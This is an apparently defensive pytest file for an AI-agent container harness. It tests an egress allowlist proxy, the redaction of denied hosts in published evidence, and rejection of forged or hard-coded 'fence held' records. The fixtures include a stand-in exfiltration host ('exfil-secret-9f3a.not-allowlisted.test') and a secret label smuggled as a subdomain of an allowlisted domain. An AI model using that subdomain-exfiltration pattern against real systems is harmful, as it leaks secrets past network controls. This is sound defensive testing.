"""Honest fence evidence: redacted refusals, parser flags, empty is not clean."""

from __future__ import annotations

import ast
import json
import socket
from pathlib import Path

import pytest
from legalforecast.multiharness.container_harness.egress_proxy import (
    REASON_HOST_NOT_ALLOWLISTED,
    AllowlistConnectProxy,
    EgressAllowlist,
)
from legalforecast.multiharness.container_harness.evidence import (
    EgressEvidenceError,
    is_clean_egress,
    parse_egress_evidence,
)
from legalforecast.multiharness.container_harness.fence import (
    FenceEvidenceError,
    FenceObservation,
    ParserFenceFields,
    fence_from_parser_fields,
    require_honest_fence_record,
)
from legalforecast.multiharness.container_harness.intake import (
    IntakeError,
    publish_intake_package,
    validate_intake_package,
)
from legalforecast.multiharness.container_harness.plan import ContainerHarnessError
from legalforecast.multiharness.container_harness.publication import (
    DENIED_HOST_PLACEHOLDER,
    PublicationError,
    denied_host_token,
    write_published_package,
)
from legalforecast.multiharness.container_harness.runtime import _read_evidence

ATTACKER_LABEL = "exfil-secret-9f3a"
ATTACKER_HOST = f"{ATTACKER_LABEL}.not-allowlisted.test"
PACKAGE = (
    Path(__file__).resolve().parents[1] / "legalforecast/multiharness/container_harness"
)


def _connect(proxy_port: int, host: str, port: int) -> bytes:
    request = f"CONNECT {host}:{port} HTTP/1.1\r\n\r\n".encode("ascii")
    with socket.create_connection(("127.0.0.1", proxy_port), timeout=10) as client:
        client.sendall(request)
        client.settimeout(10)
        received = bytearray()
        while True:
            try:
                chunk = client.recv(4096)
            except (TimeoutError, OSError):
                break
            if not chunk:
                break
            received.extend(chunk)
        return bytes(received)


def _tree_text(root: Path) -> str:
    chunks: list[str] = []
    for path in sorted(root.rglob("*")):
        if path.is_file():
            chunks.append(path.read_text(encoding="utf-8"))
    return "\n".join(chunks)


def test_denied_attacker_label_does_not_appear_in_published_package(
    tmp_path: Path,
) -> None:
    allowlist = EgressAllowlist.from_rules(hosts=["api.anthropic.com"], ports=[443])
    with AllowlistConnectProxy(allowlist) as proxy:
        response = _connect(proxy.port, ATTACKER_HOST, 443)

    assert b"403" in response
    raw_hosts = [decision.host for decision in proxy.evidence.refused()]
    assert ATTACKER_HOST in raw_hosts

    evidence = proxy.evidence.to_record()
    destination = tmp_path / "published"
    write_published_package(
        destination,
        result_record={
            "run_id": "cycle1-claude-code",
            "egress_allowlist": allowlist.to_record(),
        },
        egress_evidence=evidence,
        fence=fence_from_parser_fields(
            ParserFenceFields(
                parse_ok=True,
                reports_fence=True,
                tools_available=("Bash",),
            )
        ),
        allowlist=allowlist.to_record(),
    )

    published = _tree_text(destination)
    assert ATTACKER_HOST not in published
    assert ATTACKER_LABEL not in published
    token = denied_host_token(ATTACKER_HOST)
    assert token == DENIED_HOST_PLACEHOLDER
    assert token == denied_host_token("different-attacker-choice.invalid")
    assert token in published

    community = tmp_path / "community"
    publish_intake_package(destination, community)
    community_text = _tree_text(community)
    assert ATTACKER_HOST not in community_text
    assert ATTACKER_LABEL not in community_text
    assert token in community_text


def test_in_process_proxy_record_still_names_the_denied_host() -> None:
    allowlist = EgressAllowlist.from_rules(hosts=["api.anthropic.com"], ports=[443])
    with AllowlistConnectProxy(allowlist) as proxy:
        _connect(proxy.port, ATTACKER_HOST, 443)
    refused = proxy.evidence.to_record()["refused"]
    assert refused[0]["host"] == ATTACKER_HOST
    assert refused[0]["reason"] == REASON_HOST_NOT_ALLOWLISTED


def test_intake_refuses_a_raw_denied_hostname_in_the_community_tree(
    tmp_path: Path,
) -> None:
    package = tmp_path / "hand-authored"
    package.mkdir()
    (package / "result.json").write_text(
        json.dumps(
            {
                "egress_refused": [
                    {
                        "host": ATTACKER_HOST,
                        "port": 443,
                        "reason": REASON_HOST_NOT_ALLOWLISTED,
                    }
                ]
            }
        )
        + "\n",
        encoding="utf-8",
    )

    with pytest.raises(IntakeError, match="redacted"):
        validate_intake_package(package)


def test_intake_refuses_malformed_json_instead_of_skipping_it(tmp_path: Path) -> None:
    package = tmp_path / "hand-authored"
    package.mkdir()
    (package / "proxy-logs.json").write_text(
        '{"refused":[{"host":"chosen.invalid"}', encoding="utf-8"
    )

    with pytest.raises(IntakeError, match="not JSON"):
        validate_intake_package(package)


def test_intake_refuses_forged_fence_and_raw_allowed_label(tmp_path: Path) -> None:
    package = tmp_path / "hand-authored"
    package.mkdir()
    allowlist = {
        "hosts": ["api.anthropic.com"],
        "subdomain_suffixes": ["anthropic.com"],
        "ports": [443],
    }
    (package / "result.json").write_text(
        json.dumps(
            {
                "egress_allowlist": allowlist,
                "egress_allowed_hosts": [f"{ATTACKER_LABEL}.api.anthropic.com"],
                "egress_refused": [],
                "egress_allowed_host_count": 1,
                "egress_refused_count": 0,
            }
        ),
        encoding="utf-8",
    )
    (package / "proxy-logs.json").write_text(
        json.dumps(
            {
                "allowed_hosts": [f"{ATTACKER_LABEL}.api.anthropic.com"],
                "refused": [],
                "decision_count": 1,
            }
        ),
        encoding="utf-8",
    )
    (package / "fence.json").write_text(
        json.dumps(
            {
                "observable": False,
                "native_tools_enabled": True,
                "server_side_web_tools_disabled": True,
                "web_tools_available": [],
                "web_request_count": 0,
                "source": "unobservable",
            }
        ),
        encoding="utf-8",
    )

    with pytest.raises(IntakeError, match="unredacted allowed host"):
        validate_intake_package(package)

    sanitized = ["*.anthropic.com"]
    result = json.loads((package / "result.json").read_text(encoding="utf-8"))
    result["egress_allowed_hosts"] = sanitized
    (package / "result.json").write_text(json.dumps(result), encoding="utf-8")
    proxy = json.loads((package / "proxy-logs.json").read_text(encoding="utf-8"))
    proxy["allowed_hosts"] = sanitized
    (package / "proxy-logs.json").write_text(json.dumps(proxy), encoding="utf-8")

    with pytest.raises(IntakeError, match="parser observations"):
        validate_intake_package(package)


def test_allowed_subdomain_is_published_as_the_parent_not_the_secret(
    tmp_path: Path,
) -> None:
    evidence = {
        "allowed_hosts": [f"{ATTACKER_LABEL}.api.anthropic.com"],
        "refused": [],
        "decision_count": 1,
    }
    destination = tmp_path / "published"
    write_published_package(
        destination,
        result_record={},
        egress_evidence=evidence,
        fence=fence_from_parser_fields(
            ParserFenceFields(
                parse_ok=True, reports_fence=True, tools_available=("Bash",)
            )
        ),
        allowlist={
            "hosts": ["api.anthropic.com"],
            "subdomain_suffixes": ["anthropic.com"],
            "ports": [443],
        },
    )
    published = _tree_text(destination)
    logs = json.loads((destination / "proxy-logs.json").read_text(encoding="utf-8"))
    assert ATTACKER_LABEL not in published
    assert logs["allowed_hosts"] == ["*.anthropic.com"]


def test_writer_refuses_an_allowed_host_outside_the_declared_allowlist(
    tmp_path: Path,
) -> None:
    with pytest.raises(PublicationError, match="outside the declared allowlist"):
        write_published_package(
            tmp_path / "published",
            result_record={},
            egress_evidence={
                "allowed_hosts": [ATTACKER_HOST],
                "refused": [],
                "decision_count": 1,
            },
            fence=fence_from_parser_fields(
                ParserFenceFields(parse_ok=True, reports_fence=False)
            ),
            allowlist={
                "hosts": ["api.anthropic.com"],
                "subdomain_suffixes": [],
                "ports": [443],
            },
        )


def test_hardcoded_true_fence_flags_fail() -> None:
    with pytest.raises(FenceEvidenceError, match="cannot claim the fence held"):
        FenceObservation(
            observable=False,
            native_tools_enabled=True,
            server_side_web_tools_disabled=True,
            web_tools_available=(),
            web_request_count=0,
            source="unobservable",
        )
    with pytest.raises(FenceEvidenceError, match="parser observations"):
        require_honest_fence_record(
            {
                "native_tools_enabled": True,
                "server_side_web_tools_disabled": True,
            }
        )


def test_serialized_fence_must_equal_its_parser_fields() -> None:
    honest = fence_from_parser_fields(
        ParserFenceFields(
            parse_ok=True,
            reports_fence=True,
            tools_available=("Bash",),
            server_side_web_tools_available=(),
            server_side_web_request_count=0,
        )
    ).to_record()
    require_honest_fence_record(honest)

    forged = dict(honest)
    forged["parser_fields"] = None
    with pytest.raises(FenceEvidenceError, match="parser fields"):
        require_honest_fence_record(forged)

    mismatched = dict(honest)
    mismatched["server_side_web_tools_disabled"] = False
    with pytest.raises(FenceEvidenceError, match="does not match"):
        require_honest_fence_record(mismatched)


def test_parser_failure_and_unobservable_rows_cannot_claim_the_fence_held() -> None:
    failed = fence_from_parser_fields(
        ParserFenceFields(parse_ok=False, reports_fence=True)
    )
    silent = fence_from_parser_fields(
        ParserFenceFields(parse_ok=True, reports_fence=False)
    )
    assert failed.observable is False
    assert failed.source == "parser_failure"
    assert failed.server_side_web_tools_disabled is None
    assert silent.observable is False
    assert silent.source == "unobservable"
    assert silent.server_side_web_tools_disabled is None
    with pytest.raises(FenceEvidenceError, match="cannot claim the fence held"):
        require_honest_fence_record(
            failed.to_record() | {"server_side_web_tools_disabled": True}
        )


def test_fence_flags_are_derived_from_parser_observations() -> None:
    held = fence_from_parser_fields(
        ParserFenceFields(
            parse_ok=True,
            reports_fence=True,
            tools_available=("Bash", "Read"),
            server_side_web_tools_available=(),
            server_side_web_request_count=0,
        )
    )
    open_web = fence_from_parser_fields(
        ParserFenceFields(
            parse_ok=True,
            reports_fence=True,
            tools_available=("WebSearch",),
            server_side_web_tools_available=("WebSearch",),
            server_side_web_request_count=4,
        )
    )
    assert held.observable is True
    assert held.native_tools_enabled is True
    assert held.server_side_web_tools_disabled is True
    assert held.source == "parser"
    assert open_web.server_side_web_tools_disabled is False
    require_honest_fence_record(held.to_record())
    require_honest_fence_record(open_web.to_record())


def test_production_package_does_not_hardcode_fence_true() -> None:
    flagged: list[str] = []
    names = {"server_side_web_tools_disabled", "native_tools_enabled"}
    for path in sorted(PACKAGE.glob("*.py")):
        tree = ast.parse(path.read_text(encoding="utf-8"), filename=str(path))
        for node in ast.walk(tree):
            if isinstance(node, ast.keyword) and node.arg in names:
                if isinstance(node.value, ast.Constant) and node.value.value is True:
                    flagged.append(f"{path.name}:{node.lineno}")
            if isinstance(node, ast.Assign):
                for target in node.targets:
                    if isinstance(target, ast.Name) and target.id in names:
                        if (
                            isinstance(node.value, ast.Constant)
                            and node.value.value is True
                        ):
                            flagged.append(f"{path.name}:{node.lineno}")
    assert flagged == []


def test_empty_or_missing_egress_evidence_is_not_treated_as_clean() -> None:
    assert is_clean_egress(None) is False
    empty = parse_egress_evidence(
        {"allowed_hosts": [], "refused": [], "decision_count": 0}
    )
    assert empty.empty is True
    assert is_clean_egress(empty) is False
    observed = parse_egress_evidence(
        {
            "allowed_hosts": ["api.anthropic.com"],
            "refused": [],
            "decision_count": 1,
        }
    )
    assert is_clean_egress(observed) is True
    with pytest.raises(EgressEvidenceError, match="not treated as clean"):
        parse_egress_evidence({})
    with pytest.raises(EgressEvidenceError, match="not treated as clean"):
        parse_egress_evidence({"allowed_hosts": [], "refused": []})


@pytest.mark.parametrize(
    "refused",
    [
        [{}],
        [{"host": "", "port": "443", "reason": "not_allowlisted"}],
        [{"host": "example.invalid", "port": 443, "reason": ""}],
        [{"host": "", "port": 443, "reason": "malformed_request"}],
    ],
)
def test_malformed_refusal_records_are_not_accounted(
    refused: list[object],
) -> None:
    with pytest.raises(EgressEvidenceError, match="refused"):
        parse_egress_evidence(
            {"allowed_hosts": [], "refused": refused, "decision_count": 1}
        )


def test_runtime_does_not_default_missing_egress_keys_to_clean(
    tmp_path: Path,
) -> None:
    path = tmp_path / "egress-evidence.json"
    path.write_text("{}\n", encoding="utf-8")
    with pytest.raises(ContainerHarnessError, match="accounted"):
        _read_evidence(path)


def test_write_published_package_refuses_unaccounted_egress(tmp_path: Path) -> None:
    with pytest.raises(
        (EgressEvidenceError, PublicationError), match="not treated as clean"
    ):
        write_published_package(
            tmp_path / "published",
            result_record={},
            egress_evidence={},
            fence=fence_from_parser_fields(
                ParserFenceFields(parse_ok=True, reports_fence=True)
            ),
        )


def test_empty_accounted_egress_cannot_be_published_as_clean(
    tmp_path: Path,
) -> None:
    destination = tmp_path / "published"
    write_published_package(
        destination,
        result_record={"run_id": "cycle1-claude-code"},
        egress_evidence={"allowed_hosts": [], "refused": [], "decision_count": 0},
        fence=fence_from_parser_fields(
            ParserFenceFields(parse_ok=True, reports_fence=False)
        ),
        allowlist={
            "hosts": ["api.anthropic.com"],
            "subdomain_suffixes": [],
            "ports": [443],
        },
    )
    fence = json.loads((destination / "fence.json").read_text(encoding="utf-8"))
    logs = json.loads((destination / "proxy-logs.json").read_text(encoding="utf-8"))
    assert fence["server_side_web_tools_disabled"] is None
    assert fence["observable"] is False
    assert logs["decision_count"] == 0
    assert is_clean_egress(parse_egress_evidence(logs)) is False
